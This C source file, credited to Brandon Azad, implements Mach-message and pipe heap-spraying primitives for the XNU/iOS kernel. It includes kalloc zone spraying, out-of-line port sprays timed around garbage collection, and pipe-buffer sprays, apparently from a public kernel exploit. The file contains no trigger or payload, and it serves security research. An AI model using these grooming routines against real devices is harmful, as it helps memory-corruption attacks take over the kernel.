/*
 * kernel_alloc.c
 * Brandon Azad
 */
#include "kernel_alloc.h"

#include <assert.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>
#include <CoreFoundation/CoreFoundation.h>

#include "log.h"
#include "parameters.h"
#include "platform.h"

// Compute the minimum of 2 values.
#define min(a, b) ((a) < (b) ? (a) : (b))

size_t
message_size_for_kalloc_size(size_t kalloc_size) {
	if (kalloc_size <= kmsg_zone_size) {
		return 0;
	}
	// Thanks Ian!
	return ((3 * kalloc_size) / 4) - 0x74;
}

size_t
kalloc_size_for_message_size(size_t message_size) {
	if (message_size <= message_size_for_kmsg_zone) {
		return 0;
	}
	return message_size + ((message_size - 28) / 12) * 4 + 164;
}

size_t
ipc_kmsg_size_for_message_size(size_t message_size) {
	if (message_size <= message_size_for_kmsg_zone) {
		return kmsg_zone_size;
	}
	return kalloc_size_for_message_size(message_size);
}

// A message containing out-of-line ports.
struct ool_ports_msg {
	mach_msg_header_t               header;
	mach_msg_body_t                 body;
	mach_msg_ool_ports_descriptor_t ool_ports[0];
};

size_t
ool_ports_spray_port(mach_port_t holding_port,
		const mach_port_t *ool_ports, size_t port_count,
		mach_msg_type_name_t ool_disposition, size_t ool_count,
		size_t message_size, size_t message_count) {
	// Calculate the size of each component.
	struct ool_ports_msg *msg;
	// Sanity checks.
	assert(sizeof(*msg) + ool_count * sizeof(msg->ool_ports[0]) <= message_size);
	assert(port_count * ool_count <= max_ool_ports_per_message);
	assert(message_count <= MACH_PORT_QLIMIT_MAX);
	// Allocate a message containing the required number of OOL ports descriptors.
	msg = calloc(1, message_size);
	assert(msg != NULL);
	// Trace the kalloc allocations we're about to perform.
	DEBUG_TRACE(2, "%s: %zu * kalloc(%zu) + %zu * kalloc(%zu)", __func__,
			ool_count * message_count, port_count * sizeof(uint64_t),
			message_count, kalloc_size_for_message_size(message_size));
	// If the user didn't supply any ool_ports, create our own.
	mach_port_t *alloc_ports = NULL;
	if (ool_ports == NULL) {
		alloc_ports = calloc(port_count, sizeof(mach_port_t));
		assert(alloc_ports != NULL);
		ool_ports = alloc_ports;
	}
	// Populate the message. Each OOL ports descriptor will be a kalloc.
	msg->header.msgh_bits           = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
	msg->header.msgh_remote_port    = holding_port;
	msg->header.msgh_size           = (mach_msg_size_t) message_size;
	msg->header.msgh_id             = 'ools';
	msg->body.msgh_descriptor_count = (mach_msg_size_t) ool_count;
	mach_msg_ool_ports_descriptor_t ool_descriptor = {};
	ool_descriptor.type             = MACH_MSG_OOL_PORTS_DESCRIPTOR;
	ool_descriptor.address          = (void *) ool_ports;
	ool_descriptor.count            = (mach_msg_size_t) port_count;
	ool_descriptor.deallocate       = FALSE;
	ool_descriptor.copy             = MACH_MSG_PHYSICAL_COPY;
	ool_descriptor.disposition      = ool_disposition;
	for (size_t i = 0; i < ool_count; i++) {
		msg->ool_ports[i] = ool_descriptor;
	}
	// Send the messages.
	size_t messages_sent = 0;
	for (; messages_sent < message_count; messages_sent++) {
		kern_return_t kr = mach_msg(
				&msg->header,
				MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
				(mach_msg_size_t) message_size,
				0,
				MACH_PORT_NULL,
				MACH_MSG_TIMEOUT_NONE,
				MACH_PORT_NULL);
		if (kr != KERN_SUCCESS) {
			ERROR("%s returned %d: %s", "mach_msg", kr, mach_error_string(kr));
			break;
		}
	}
	// Clean up the allocated ports.
	if (alloc_ports != NULL) {
		free(alloc_ports);
	}
	// Return the number of messages we sent.
	return messages_sent;
}

/*
 * kalloc_spray_compute_message_shape
 *
 * Description:
 * 	Compute the shape of a message to maximally spray the specified kalloc zone. This spray is
 * 	good for consuming memory, not for overwriting memory with specific contents.
 */
static void
kalloc_spray_compute_message_shape(size_t kalloc_min, size_t kalloc_zone,
		size_t *message_size, size_t *ools_per_message, size_t *ports_per_ool) {
	assert(kmsg_zone_size < kalloc_min);
	assert(kalloc_min <= kalloc_zone);
	// We always want to maximize the number of OOL port kalloc allocations per message, so let
	// the message take up the a full zone element if needed.
	size_t max_message_size = message_size_for_kalloc_size(kalloc_zone);
	// Since we can send a maximum of max_ool_ports_per_message OOL ports in a single message,
	// we always want to send the minimum number of OOL ports in each descriptor (since adding
	// more ports in a descriptor only counts against the limit without increasing the number
	// of allocations). Thus, use the smallest number of ports that gets us at least
	// kalloc_min.
	size_t ports_per_ool_ = (kalloc_min + sizeof(uint64_t) - 1) / sizeof(uint64_t);
	// How many OOL ports descriptors can we send per message? As many as we'd like, as long
	// as:
	// 1. we have space for them in the message, and
	// 2. we don't blow through the max_ool_ports_per_message limit.
	size_t max_ools_by_message_size =
		(max_message_size - sizeof(mach_msg_base_t))
			/ sizeof(mach_msg_ool_ports_descriptor_t);
	size_t max_ools_by_port_limit = max_ool_ports_per_message / ports_per_ool_;
	size_t ools_per_message_ = min(max_ools_by_message_size, max_ools_by_port_limit);
	// Now that we know how many OOL ports descriptors we can send per message, let's calculate
	// the message size. If the message size is too small, we'll just round it up.
	size_t message_size_ = sizeof(mach_msg_base_t)
		+ ools_per_message_ * sizeof(mach_msg_ool_ports_descriptor_t);
	assert(kalloc_size_for_message_size(message_size_) <= kalloc_zone);
	if (kalloc_size_for_message_size(message_size_) < kalloc_min) {
		size_t kalloc_min_rounded = (kalloc_min + 15) & ~15;
		message_size_ = (message_size_for_kalloc_size(kalloc_min_rounded) + 3) & ~3;
	}
	assert(kalloc_min <= kalloc_size_for_message_size(message_size_));
	assert(kalloc_size_for_message_size(message_size_) <= kalloc_zone);
	// Return the values.
	*message_size     = message_size_;
	*ools_per_message = ools_per_message_;
	*ports_per_ool    = ports_per_ool_;
}

size_t
kalloc_spray_port(mach_port_t holding_port, size_t min_kalloc_size, size_t kalloc_zone,
		size_t kalloc_count) {
	// First compute the message shape for spraying the specified zone.
	size_t message_size, ools_per_message, ports_per_ool;
	kalloc_spray_compute_message_shape(min_kalloc_size, kalloc_zone,
			&message_size, &ools_per_message, &ports_per_ool);
	assert(min_kalloc_size <= kalloc_size_for_message_size(message_size));
	assert(kalloc_size_for_message_size(message_size) <= kalloc_zone);
	assert(min_kalloc_size <= ports_per_ool * sizeof(uint64_t));
	assert(ports_per_ool * sizeof(uint64_t) <= kalloc_zone);
	assert(sizeof(mach_msg_base_t) + ools_per_message * sizeof(mach_msg_ool_ports_descriptor_t) <= message_size);
	// How many allocations does each message we send give us? Well, there's 1 allocation for
	// the message and 1 allocation for each OOL ports descriptor.
	size_t kallocs_per_message = 1 + ools_per_message;
	// How many full/partial messages will we need to spray kalloc_count allocations? If the
	// number of full messages is greater than the queue limit, truncate to that many messages.
	size_t full_message_count = kalloc_count / kallocs_per_message;
	size_t partial_message_kalloc_count = kalloc_count % kallocs_per_message;
	if (full_message_count >= MACH_PORT_QLIMIT_MAX) {
		full_message_count = MACH_PORT_QLIMIT_MAX;
		partial_message_kalloc_count = 0;
	}
	// Alright, so now we have all the parameters we need. Spray all the full messages to the
	// port.
	DEBUG_TRACE(2, "%s: %zu full messages, %zu descriptors per message, "
			"%zu ports per descriptor, %zu kallocs (%zu bytes) per message",
			__func__, full_message_count, ools_per_message, ports_per_ool,
			kallocs_per_message, kallocs_per_message * kalloc_zone);
	size_t full_messages_sent = ool_ports_spray_port(
			holding_port,
			NULL,
			ports_per_ool,
			MACH_MSG_TYPE_MAKE_SEND,
			ools_per_message,
			message_size,
			full_message_count);
	size_t full_messages_kallocs = full_messages_sent * kallocs_per_message;
	// If we sent all the full messages (indicating no errors were encountered) and we also
	// want to send a partial message, send that.
	size_t partial_message_kallocs = 0;
	if (full_messages_sent == full_message_count && partial_message_kalloc_count > 0) {
		size_t partial_message_ools = partial_message_kalloc_count - 1;
		size_t partial_messages_sent = ool_ports_spray_port(
				holding_port,
				NULL,
				ports_per_ool,
				MACH_MSG_TYPE_MAKE_SEND,
				partial_message_ools,
				message_size,
				1);
		partial_message_kallocs = partial_messages_sent * partial_message_kalloc_count;
	}
	// Finally, return the total number of kallocs stashed in our port.
	assert(full_messages_kallocs + partial_message_kallocs <= kalloc_count);
	return full_messages_kallocs + partial_message_kallocs;
}

size_t
kalloc_spray_size(mach_port_t *holding_ports, size_t *port_count,
		size_t min_kalloc_size, size_t kalloc_zone, size_t spray_size) {
	size_t kallocs_needed = (spray_size + kalloc_zone - 1) / kalloc_zone;
	size_t count = *port_count;
	// Spray to each of the ports in turn.
	size_t kallocs_left = kallocs_needed;
	size_t ports_used = 0;
	for (; ports_used < count && kallocs_left > 0; ports_used++) {
		size_t kallocs_done = kalloc_spray_port(holding_ports[ports_used],
				min_kalloc_size, kalloc_zone, kallocs_left);
		assert(kallocs_done <= kallocs_left);
		kallocs_left -= kallocs_done;
	}
	// Compute how many kallocs were actually performed.
	size_t kallocs_done = kallocs_needed - kallocs_left;
	if (kallocs_left > 0) {
		WARNING("failed to spray %zu * kalloc(%zu)", kallocs_left, kalloc_zone);
	}
	// Return the number of ports actually used and the number of bytes actually sprayed.
	*port_count = ports_used;
	return kallocs_done * kalloc_zone;
}

mach_port_t *
create_ports(size_t count) {
	mach_port_t *ports = calloc(count, sizeof(*ports));
	assert(ports != NULL);
	mach_port_options_t options = {};
	for (size_t i = 0; i < count; i++) {
		kern_return_t kr = mach_port_construct(mach_task_self(), &options, 0, &ports[i]);
		assert(kr == KERN_SUCCESS);
	}
	return ports;
}

void
destroy_ports(mach_port_t *ports, size_t count) {
	for (size_t i = 0; i < count; i++) {
		mach_port_t port = ports[i];
		if (MACH_PORT_VALID(port)) {
			kern_return_t kr = mach_port_destroy(mach_task_self(), port);
			if (kr != KERN_SUCCESS) {
				ERROR("%s returned %d: %s", "mach_port_destroy",
						kr, mach_error_string(kr));
			}
		}
		ports[i] = MACH_PORT_DEAD;
	}
}

void
deallocate_ports(mach_port_t *ports, size_t count) {
	for (size_t i = 0; i < count; i++) {
		mach_port_t port = ports[i];
		if (MACH_PORT_VALID(port)) {
			kern_return_t kr = mach_port_deallocate(mach_task_self(), port);
			if (kr != KERN_SUCCESS) {
				ERROR("%s returned %d: %s", "mach_port_deallocate",
						kr, mach_error_string(kr));
			}
		}
		ports[i] = MACH_PORT_DEAD;
	}
}

void
port_increase_queue_limit(mach_port_t port) {
	mach_port_limits_t limits = { .mpl_qlimit = MACH_PORT_QLIMIT_MAX };
	kern_return_t kr = mach_port_set_attributes(
			mach_task_self(),
			port,
			MACH_PORT_LIMITS_INFO,
			(mach_port_info_t) &limits,
			MACH_PORT_LIMITS_INFO_COUNT);
	assert(kr == KERN_SUCCESS);
}

void
port_insert_send_right(mach_port_t port) {
	kern_return_t kr = mach_port_insert_right(mach_task_self(), port, port,
			MACH_MSG_TYPE_MAKE_SEND);
	assert(kr == KERN_SUCCESS);
}

/*
 * ool_ports_spray_size_with_gc_compute_parameters
 *
 * Description:
 * 	Compute the spray parameters for ool_ports_spray_size_with_gc().
 */
static void
ool_ports_spray_size_with_gc_compute_parameters(
		size_t ports_per_ool, size_t message_size, size_t spray_size,
		size_t *ool_size, size_t *ools_per_message, size_t *ools_needed) {
	// Each message will contain no more than gc_step bytes of OOL ports.
	const size_t max_ool_memory_per_message = gc_step;
	// How many OOL ports descriptors can we send per message? As many as we'd like, as long
	// as:
	// 1. we aren't sending more than gc_step bytes of OOL ports in a message,
	// 2. we have space for them in the message, and
	// 3. we don't blow through the max_ool_ports_per_message limit.
	size_t ool_size_ = ports_per_ool * sizeof(uint64_t);
	size_t max_ools_by_memory = max_ool_memory_per_message / ool_size_;
	size_t max_ools_by_message_size =
		(message_size - sizeof(mach_msg_base_t))
			/ sizeof(mach_msg_ool_ports_descriptor_t);
	size_t max_ools_by_port_limit = max_ool_ports_per_message / ports_per_ool;
	size_t ools_per_message_ = min(max_ools_by_memory,
			min(max_ools_by_message_size, max_ools_by_port_limit));
	// How many OOL port descriptors will we need to spray? Enough to fill all the requested
	// memory.
	size_t ools_needed_ = (spray_size + ool_size_ - 1) / ool_size_;
	// Return the parameters.
	*ool_size         = ool_size_;
	*ools_per_message = ools_per_message_;
	*ools_needed      = ools_needed_;
}

size_t
ool_ports_spray_size_with_gc(mach_port_t *holding_ports, size_t *holding_port_count,
		size_t message_size, const mach_port_t *ool_ports, size_t ool_port_count,
		mach_msg_type_name_t ool_disposition, size_t spray_size) {
	// Compute the parameters for the spray.
	size_t ool_size, ools_per_message, ools_needed;
	ool_ports_spray_size_with_gc_compute_parameters(ool_port_count, message_size, spray_size,
			&ool_size, &ools_per_message, &ools_needed);
	// Spray to each of the ports in turn until we've created the requisite number of OOL ports
	// allocations.
	ssize_t ools_left = ools_needed;
	size_t sprayed = 0;
	size_t next_gc_step = 0;
	size_t port_count = *holding_port_count;
	size_t ports_used = 0;
	for (; ports_used < port_count && ools_left > 0; ports_used++) {
		// Spray this port one message at a time until we've maxed out its queue.
		size_t messages_sent = 0;
		for (; messages_sent < (kCFCoreFoundationVersionNumber >= 1535.12 ? MACH_PORT_QLIMIT_MAX : MACH_PORT_QLIMIT_DEFAULT) && ools_left > 0; messages_sent++) {
			// If we've crossed the GC sleep boundary, sleep for a bit and schedule the
			// next one.
			if (sprayed >= next_gc_step) {
				next_gc_step += gc_step;
				pthread_yield_np();
				usleep(10000);
				fprintf(stderr, ".");
			}
			// Send a message.
			size_t sent = ool_ports_spray_port(
					holding_ports[ports_used],
					ool_ports,
					ool_port_count,
					ool_disposition,
					ools_per_message,
					message_size,
					1);
			// If we couldn't send a message to this port, stop trying to send more
			// messages and move on to the next port.
			if (sent != 1) {
				assert(sent == 0);
				break;
			}
			// We sent a full message worth of OOL port descriptors.
			sprayed += ools_per_message * ool_size;
			ools_left -= ools_per_message;
		}
	}
	fprintf(stderr, "\n");
	// Return the number of ports actually used and the number of bytes actually sprayed.
	*holding_port_count = ports_used;
	return sprayed;
}

void
port_drain_messages(mach_port_t port, void (^message_handler)(mach_msg_header_t *)) {
	kern_return_t kr;
	mach_msg_option_t options = MACH_RCV_MSG | MACH_RCV_LARGE | MACH_RCV_TIMEOUT
		| MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0)
		| MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_NULL);
	// Allocate an initial message buffer.
	mach_msg_size_t msg_size = 0x4000;
	mach_msg_base_t *msg = malloc(msg_size);
	assert(msg != NULL);
	// Loop through all the messages queued on the port.
	for (;;) {
		// Try to receive the message. If the buffer isn't big enough, reallocate
		// and try again. This should only happen twice.
		for (size_t try = 0;; try++) {
			assert(try < 2);
			// Receive the message.
			kr = mach_msg(
					&msg->header,
					options,
					0,
					msg_size,
					port,
					0,
					MACH_PORT_NULL);
			if (kr != MACH_RCV_LARGE) {
				break;
			}
			// The buffer was too small, increase it.
			msg_size = msg->header.msgh_size + REQUESTED_TRAILER_SIZE(options);
			free(msg);
			msg = malloc(msg_size);
			assert(msg != NULL);
		}
		// If we got an error, stop processing messages on this port. If the error is a
		// timeout, that means that we've exhausted the queue, so don't print an error
		// message.
		if (kr != KERN_SUCCESS) {
			if (kr != MACH_RCV_TIMED_OUT) {
				ERROR("%s returned %d: %s", "mach_msg", kr, mach_error_string(kr));
			}
			break;
		}
		// Pass the message to the message handler.
		message_handler(&msg->header);
	}
	// Clean up resources.
	free(msg);
}

void
port_discard_messages(mach_port_t port) {
	port_drain_messages(port, ^(mach_msg_header_t *header) {
		mach_msg_destroy(header);
	});
}

void
ool_ports_spray_receive(mach_port_t *holding_ports, size_t holding_port_count,
		void (^ool_ports_handler)(mach_port_t *, size_t)) {
	// Loop through all the ports.
	for (size_t port_index = 0; port_index < holding_port_count; port_index++) {
		// Handle each message on the port.
		port_drain_messages(holding_ports[port_index], ^(mach_msg_header_t *msg0) {
			struct ool_ports_msg *msg = (struct ool_ports_msg *)msg0;
			// We've successfully received a message. Make sure it's the type we
			// expect.
			if (msg->header.msgh_id != 'ools') {
				WARNING("received unexpected message id 0x%x",
						msg->header.msgh_id);
				goto done;
			}
			if (!MACH_MSGH_BITS_IS_COMPLEX(msg->header.msgh_bits)) {
				WARNING("skipping non-complex message");
				goto done;
			}
			// Go through the descriptors one at a time passing them to the handler
			// block.
			mach_msg_descriptor_t *d = (mach_msg_descriptor_t *)&msg->ool_ports[0];
			for (size_t i = 0; i < msg->body.msgh_descriptor_count; i++) {
				void *next;
				switch (d->type.type) {
					case MACH_MSG_OOL_PORTS_DESCRIPTOR:
						next = &d->ool_ports + 1;
						mach_port_t *ports = (mach_port_t *)
							d->ool_ports.address;
						size_t count = d->ool_ports.count;
						ool_ports_handler(ports, count);
						break;
					default:
						WARNING("unexpected descriptor type %u",
								d->type.type);
						goto done;
				}
				d = (mach_msg_descriptor_t *)next;
			}
done:
			// Discard the message.
			mach_msg_destroy(&msg->header);
		});
	}
}

void
increase_file_limit() {
	struct rlimit rl = {};
	int error = getrlimit(RLIMIT_NOFILE, &rl);
	assert(error == 0);
	rl.rlim_cur = 10240;
	rl.rlim_max = rl.rlim_cur;
	error = setrlimit(RLIMIT_NOFILE, &rl);
	if (error != 0) {
		ERROR("could not increase file limit");
	}
	error = getrlimit(RLIMIT_NOFILE, &rl);
	assert(error == 0);
	if (rl.rlim_cur != 10240) {
		ERROR("file limit is %llu", rl.rlim_cur);
	}
}

void
pipe_close(int pipefds[2]) {
	close(pipefds[0]);
	close(pipefds[1]);
}

/*
 * set_nonblock
 *
 * Description:
 * 	Set the O_NONBLOCK flag on the specified file descriptor.
 */
static void
set_nonblock(int fd) {
	int flags = fcntl(fd, F_GETFL);
	flags |= O_NONBLOCK;
	fcntl(fd, F_SETFL, flags);
}

int *
create_pipes(size_t *pipe_count) {
	// Allocate our initial array.
	size_t capacity = *pipe_count;
	int *pipefds = calloc(2 * capacity, sizeof(int));
	assert(pipefds != NULL);
	// Create as many pipes as we can.
	size_t count = 0;
	for (; count < capacity; count++) {
		// First create our pipe fds.
		int fds[2] = { -1, -1 };
		int error = pipe(fds);
		// Unfortunately pipe() seems to return success with invalid fds once we've
		// exhausted the file limit. Check for this.
		if (error != 0 || fds[0] < 0 || fds[1] < 0) {
			pipe_close(fds);
			break;
		}
		// Mark the write-end as nonblocking.
		set_nonblock(fds[1]);
		// Store the fds.
		pipefds[2 * count + 0] = fds[0];
		pipefds[2 * count + 1] = fds[1];
	}
	// Truncate the array to the smaller size.
	int *new_pipefds = realloc(pipefds, 2 * count * sizeof(int));
	assert(new_pipefds != NULL);
	// Return the count and the array.
	*pipe_count = count;
	return new_pipefds;
}

void
close_pipes(int *pipefds, size_t pipe_count) {
	for (size_t i = 0; i < pipe_count; i++) {
		pipe_close(pipefds + 2 * i);
	}
}

size_t
pipe_spray(const int *pipefds, size_t pipe_count,
		void *pipe_buffer, size_t pipe_buffer_size,
		void (^update)(uint32_t pipe_index, void *data, size_t size)) {
	assert(pipe_count <= 0xffffff);
	assert(pipe_buffer_size > 512);
	size_t write_size = pipe_buffer_size - 1;
	size_t pipes_filled = 0;
	for (size_t i = 0; i < pipe_count; i++) {
		// Update the buffer.
		if (update != NULL) {
			update((uint32_t)i, pipe_buffer, pipe_buffer_size);
		}
		// Fill the write-end of the pipe with the buffer. Leave off the last byte.
		int wfd = pipefds[2 * i + 1];
		ssize_t written = write(wfd, pipe_buffer, write_size);
		if (written != write_size) {
			// This is most likely because we've run out of pipe buffer memory. None of
			// the subsequent writes will work either.
			break;
		}
		pipes_filled++;
	}
	return pipes_filled;
}
